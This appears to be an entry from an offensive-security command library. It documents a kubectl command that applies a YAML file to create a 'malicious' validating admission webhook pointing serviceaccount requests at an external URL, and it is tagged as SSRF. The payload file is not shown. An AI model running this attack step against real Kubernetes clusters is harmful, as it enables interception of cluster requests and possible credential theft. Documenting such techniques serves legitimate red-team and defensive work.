---
id: cmd-kubectl-create-webhook-001
data: kubectl create -f poc1.yaml
tags:
  - webhook
  - ssrf
type: command
output: >-
  validatingwebhookconfiguration.admissionregistration.k8s.io/malicious-webhook
  created
executor: bash
platforms:
  - Kubernetes
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.689Z'
verified: false
validated: true
submitted: true
---
# create-malicious-webhook

## Command

```bash
kubectl create -f poc1.yaml
```

## Description

Applies a YAML file to create a malicious ValidatingWebhookConfiguration targeting serviceaccounts with external URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-f` | Path to YAML file | Yes |

## Examples

### Basic Usage

```bash
kubectl create -f poc1.yaml
```

### Advanced Usage

```bash
kubectl create -f poc1.yaml --dry-run=client -o yaml
```

## Expected Output

Resource created message with kind and name.

## Related

- [[commands/verify-webhook]]
- [[procedures/Create-Malicious-Admission-Webhook]]
